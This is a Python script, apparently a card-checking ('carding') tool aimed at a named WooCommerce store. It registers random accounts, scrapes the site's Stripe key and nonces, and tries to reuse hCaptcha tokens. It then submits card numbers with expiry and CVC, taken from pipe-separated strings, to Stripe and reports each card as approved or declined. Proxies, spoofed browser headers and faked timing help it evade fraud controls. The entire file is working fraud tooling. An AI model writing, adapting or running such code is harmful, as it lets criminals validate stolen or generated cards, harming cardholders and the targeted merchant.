from datetime import datetime
import hashlib
import json
import os
import random
import re
import requests
import string
import uuid

# ========================================
# CONFIGURATION
# ========================================
BASE_URL = "https://atriresearchresources.org"
CARD_COUNTRY = "BD"

# ========================================
# PAYMENT METHOD ADDER CLASS
# ========================================
class PaymentMethodAdder:
    """Handles the complete flow of adding payment methods to WooCommerce"""
    
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = format_proxy(proxy)
        self.stripe_key = None
        self.email = None
        self.password = None
        self.proxy_str = proxy

    def generate_random_account(self):
        """Generate random email and password for registration"""
        rand_id = str(uuid.uuid4())[:10]
        self.email = f"user_{rand_id}@testmail.com"
        chars = string.ascii_letters + string.digits + "!@#$"
        self.password = ''.join(random.choice(chars) for _ in range(12)) + "1aA!"
        print(f"🎲 Generated random account: {self.email}")
        return self.email, self.password
    
    def check_if_logged_in(self):
        """Check if already logged in (Statically returns False for registration flow)"""
        return False

    def get_registration_nonce(self):
        """Get registration nonce from my-account page"""
        print("🔄 Getting registration nonce...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/', headers=headers)
            
            if response.status_code == 200:
                # Extract woocommerce-register-nonce
                register_nonce = None
                match_reg = re.search(r'id="woocommerce-register-nonce"\s+name="woocommerce-register-nonce"\s+value="([a-f0-9]+)"', response.text)
                if match_reg:
                    register_nonce = match_reg.group(1)
                    print(f"✅ Registration nonce extracted: {register_nonce}")
                
                return register_nonce
            else:
                print(f"❌ Failed to load my-account page: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error getting registration nonce: {e}")
            return None

    def register(self, nonce):
        """Register a new account"""
        if not self.email or not self.password:
            self.generate_random_account()

        print(f"🔄 Registering as {self.email}...")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'referer': f'{self.base_url}/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        data = {
            'email': self.email,
            'password': self.password,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{self.base_url}/',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '8',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers['user-agent'],
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/my-account/',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                print(f"✅ Registration successful for {self.email}!")
                return True
            else:
                print(f"❌ Registration failed with status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False
    
    def extract_stripe_key_and_ajax_nonce(self):
        """Extract Stripe key and AJAX nonce from payment pages"""
        print("🔄 Extracting Stripe key and AJAX nonce...")
        
        ajax_nonce = None
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': f'{self.base_url}/my-account/',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            
            if response.status_code == 200:
                stripe_patterns = [
                    r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
                    r'"key"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
                ]
                
                for pattern in stripe_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        self.stripe_key = match.group(1)
                        print(f"✅ Stripe key extracted: {self.stripe_key[:20]}...")
                        break
                
                ajax_patterns = [
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                ]
                
                for pattern in ajax_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        ajax_nonce = match.group(1)
                        print(f"✅ AJAX nonce extracted: {ajax_nonce}")
                        break
                
                if not self.stripe_key:
                    print("❌ Could not find Stripe key in page")
                    
                if not ajax_nonce:
                    print("❌ Could not find AJAX nonce in page")
                
                return self.stripe_key, ajax_nonce
            else:
                print(f"❌ Failed to load payment method page: {response.status_code}")
                return None, None
                
        except Exception as e:
            print(f"❌ Error extracting data: {e}")
            return None, None
    
    def extract_hcaptcha_sitekey(self):
        """Extract hCaptcha sitekey from the payment page"""
        print("🔄 Checking for hCaptcha on payment page...")
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            
            if response.status_code == 200:
                hcaptcha_patterns = [
                    r'data-sitekey="([a-f0-9\-]+)"',
                    r'sitekey:\s*["\']([a-f0-9\-]+)["\']',
                    r'"sitekey"\s*:\s*"([a-f0-9\-]+)"',
                    r'hcaptcha\.com.*?sitekey=([a-f0-9\-]+)',
                ]
                
                for pattern in hcaptcha_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        sitekey = match.group(1)
                        print(f"✅ hCaptcha sitekey found: {sitekey}")
                        return sitekey
                
                print("ℹ️  No hCaptcha found on page (might not be required)")
                return None
            else:
                print(f"❌ Failed to load payment page: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error checking for hCaptcha: {e}")
            return None
    
    def get_hcaptcha_token_from_page(self):
        """Try to extract hCaptcha response token if it exists on the page"""
        print("🔄 Checking for hCaptcha response token...")
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            
            if response.status_code == 200:
                token_patterns = [
                    r'h-captcha-response["\']?\s*(?:value=|:)\s*["\']([^"\']+)["\']',
                    r'g-recaptcha-response["\']?\s*(?:value=|:)\s*["\']([^"\']+)["\']',
                    r'<textarea[^>]*name=["\']?h-captcha-response["\']?[^>]*>([^<]+)</textarea>',
                ]
                
                for pattern in token_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        token = match.group(1)
                        if len(token) > 50:
                            print(f"✅ hCaptcha token found: {token[:50]}...")
                            return token
                
                print("ℹ️  No hCaptcha response token found (needs to be solved)")
                return None
            else:
                print(f"❌ Failed to load payment page: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error extracting hCaptcha token: {e}")
            return None
    
    def create_stripe_payment_method(self, card_data, hcaptcha_token=None):
        """Create a payment method using Stripe API"""
        print("🔄 Creating Stripe payment method...")
        
        if not self.stripe_key:
            print("❌ No Stripe key available")
            return None
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        card_number = card_data.get('number', '').replace(' ', '+')
        
        # Extract muid and sid from cookies
        muid = self.session.cookies.get('__stripe_mid', '')
        sid = self.session.cookies.get('__stripe_sid', '')
        guid = str(uuid.uuid4())
        
        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': card_data.get('cvc', ''),
            'card[exp_year]': card_data.get('exp_year', ''),
            'card[exp_month]': card_data.get('exp_month', ''),
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': card_data.get('country', 'BD'),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; payment-element; deferred-intent',
            'referrer': self.base_url,
            'time_on_page': random.randint(15000, 30000),
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': self.stripe_key,
            '_stripe_version': '2024-06-20',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        }

        if hcaptcha_token:
            data['radar_options[hcaptcha_token]'] = hcaptcha_token
            
        # Filter out empty values
        data = {k: v for k, v in data.items() if v}

        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                payment_method = response.json()
                payment_method_id = payment_method.get('id')
                print(f"✅ Stripe payment method created: {payment_method_id}")
                return payment_method_id
            else:
                print(f"❌ Failed to create Stripe payment method: {response.text}")
                return None
                
        except Exception as e:
            print(f"❌ Error creating Stripe payment method: {e}")
            return None
    
    def add_payment_method_to_account(self, payment_method_id, ajax_nonce):
        """Add the payment method to WooCommerce account"""
        print(f"🔄 Adding payment method to account...")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    setup_intent_id = result.get('data', {}).get('id')
                    print(f"✅ Payment method added successfully!")
                    print(f"   Status: {result.get('data', {}).get('status')}")
                    print(f"   Setup Intent ID: {setup_intent_id}")
                    return True, setup_intent_id, "Payment method added successfully"
                else:
                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    print(f"❌ Failed to add payment method: {result}")
                    return False, None, error_msg
            else:
                print(f"❌ Error adding payment method: Status {response.status_code}")
                return False, None, f"Error adding payment method: Status {response.status_code}"
                
        except Exception as e:
            print(f"❌ Error adding payment method: {e}")
            return False, None, str(e)
    
    def run(self, card_data, hcaptcha_token=None):
        """Main execution flow with optional hCaptcha support and retry logic"""
        print("=" * 60)
        print("🚀 Starting Payment Method Addition Process (Atri Research)")
        print("=" * 60)
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {self.base_url}")
        if self.proxy_str:
            print(f"Proxy: {self.proxy_str}")
        print(f"Email: {self.email}")
        print(f"Card: {card_data.get('number', 'N/A')}")
        print("=" * 60)
        
        if not self.check_if_logged_in():
            reg_nonce = self.get_registration_nonce()
            if not reg_nonce:
                print("\n💥 Failed to get registration nonce!")
                return None, None, False, "Failed to get registration nonce"
            
            if not self.register(reg_nonce):
                print("\n💥 Failed to register!")
                return None, None, False, "Failed to register"
        
        stripe_key, ajax_nonce = self.extract_stripe_key_and_ajax_nonce()
        
        if not self.stripe_key or not ajax_nonce:
            print("\n💥 Failed to extract keys/nonces!")
            return None, None, False, "Failed to extract keys/nonces"
        
        sitekey = self.extract_hcaptcha_sitekey()
        
        current_hcaptcha_token = hcaptcha_token
        if sitekey and not current_hcaptcha_token:
            print("\n⚠️  hCaptcha detected but no token provided!")
            print(f"   Site URL: {self.base_url}/my-account/add-payment-method/")
            print(f"   Sitekey: {sitekey}")
            
            auto_token = self.get_hcaptcha_token_from_page()
            if auto_token:
                current_hcaptcha_token = auto_token
                print("   Using automatically extracted token")
        
        payment_method_id = self.create_stripe_payment_method(card_data, current_hcaptcha_token)
        if not payment_method_id:
            print("\n💥 Failed to create payment method!")
            return None, None, False, "Failed to create payment method"
        
        success, setup_intent_id, message = self.add_payment_method_to_account(payment_method_id, ajax_nonce)
        
        if success:
            print("\n" + "=" * 60)
            print("🎉 Payment Method Addition Completed Successfully!")
            print("=" * 60)
            return payment_method_id, setup_intent_id, True, message
        
        print("\n💥 Failed to add payment method to account!")
        return payment_method_id, None, False, message

# ========================================
# HELPER FUNCTIONS
# ========================================

def advanced_luhn_checksum(card_number):
    """Luhn checksum algorithm for card validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10 == 0

def parse_card_details(auth_string):
    """Parse card details from auth string format: CARD|MM|YYYY|CVC"""
    try:
        parts = auth_string.strip().split('|')
        if len(parts) != 4:
            return None
        
        card_number = parts[0].replace(' ', '').replace('-', '')
        exp_month = parts[1].zfill(2)
        exp_year = parts[2]
        cvc = parts[3]
        
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
        
        exp_year_short = exp_year[-2:]
        
        if not card_number.isdigit() or not exp_month.isdigit() or not exp_year.isdigit() or not cvc.isdigit():
            return None
        
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year_short,
            'cvc': cvc,
            'country': CARD_COUNTRY
        }
    except Exception as e:
        print(f"Error parsing card details: {e}")
        return None

def is_valid_card(card_number):
    """কার্ড নম্বর valid কিনা চেক করা"""
    return advanced_luhn_checksum(card_number)

def get_bin_info(card_number):
    """BIN API থেকে card information নিয়ে আসা"""
    try:
        bin_number = card_number[:6]
        
        print(f"🔍 Fetching BIN info for: {bin_number}")
        response = requests.get(f'https://cc-gen-lime.vercel.app/bin/{bin_number}', timeout=5)
        
        if response.status_code == 200:
            bin_data = response.json()
            if bin_data.get('bin'):
                print(f"✅ BIN info found: {bin_data.get('scheme', 'N/A')}")
                return {
                    'issuer': bin_data.get('bank', 'N/A'),
                    'brand': bin_data.get('scheme', 'N/A'),
                    'Country': {'Name': bin_data.get('country', 'N/A')},
                    'level': bin_data.get('tier', 'N/A'),
                    'type': bin_data.get('type', 'N/A')
                }
        
        print("❌ BIN info not found")
        return None
            
    except Exception as e:
        print(f"❌ Error fetching BIN info: {e}")
        return None

# ========================================
# ENDPOINT HANDLER
# ========================================
def handle_endpoint(auth, hcaptcha_token='', email=None, password=None, proxy=None):
    """
    Main endpoint handler for AtriResearchResources payment validation
    Returns: (response_dict, status_code)
    """
    if not auth:
        return {
            'success': False,
            'error': 'Missing auth parameter',
            'message': 'Please provide card details in format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC'
        }, 400
    
    card_data = parse_card_details(auth)
    
    if not card_data:
        return {
            'success': False,
            'error': 'Invalid card details format',
            'message': 'Format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC (year can be 2 or 4 digits)',
            'example': '5444228403258437|11|2028|327'
        }, 400
    
    try:
        print(f"🔐 Validating card: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        
        bin_info = get_bin_info(card_data['number'])
        
        if not is_valid_card(card_data['number']):
            error_result = {}
            
            if bin_info:
                error_result['bin_info'] = {
                    'bank': bin_info.get('issuer', 'N/A'),
                    'brand': bin_info.get('brand', 'N/A'),
                    'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                    'level': bin_info.get('level', 'N/A'),
                    'type': bin_info.get('type', 'N/A')
                }
            
            error_result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
            error_result['gateway'] = 'Stripe'
            error_result['message'] = 'Invalid card number (Failed Luhn validation)'
            error_result['status'] = 'error'
            
            return error_result, 400
        
        print("✅ Card passed Luhn validation")
        
        adder = PaymentMethodAdder(
            base_url=BASE_URL,
            proxy=proxy
        )
        
        payment_method_id, setup_intent_id, success, message = adder.run(
            card_data=card_data,
            hcaptcha_token=hcaptcha_token if hcaptcha_token else None
        )
        
        result = {}
        
        if bin_info:
            result['bin_info'] = {
                'bank': bin_info.get('issuer', 'N/A'),
                'brand': bin_info.get('brand', 'N/A'),
                'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                'level': bin_info.get('level', 'N/A'),
                'type': bin_info.get('type', 'N/A')
            }
        
        result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
        result['gateway'] = 'Stripe'
        result['message'] = message
        result['payment_method_id'] = payment_method_id
        result['setup_intent_id'] = setup_intent_id
        result['status'] = 'success' if success else 'declined'
        
        return result, 200
            
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'message': 'An error occurred while processing the request',
            'type': type(e).__name__
        }, 500

def format_proxy(proxy_str):
    """
    Format proxy string from ip:port:user:pass to http://user:pass@ip:port
    Returns dict for requests or None if invalid
    """
    if not proxy_str:
        return None
    try:
        parts = proxy_str.strip().split(':')
        if len(parts) != 4:
            return None
        ip = parts[0]
        port = parts[1]
        user = parts[2]
        password = parts[3]
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    except:
        return None
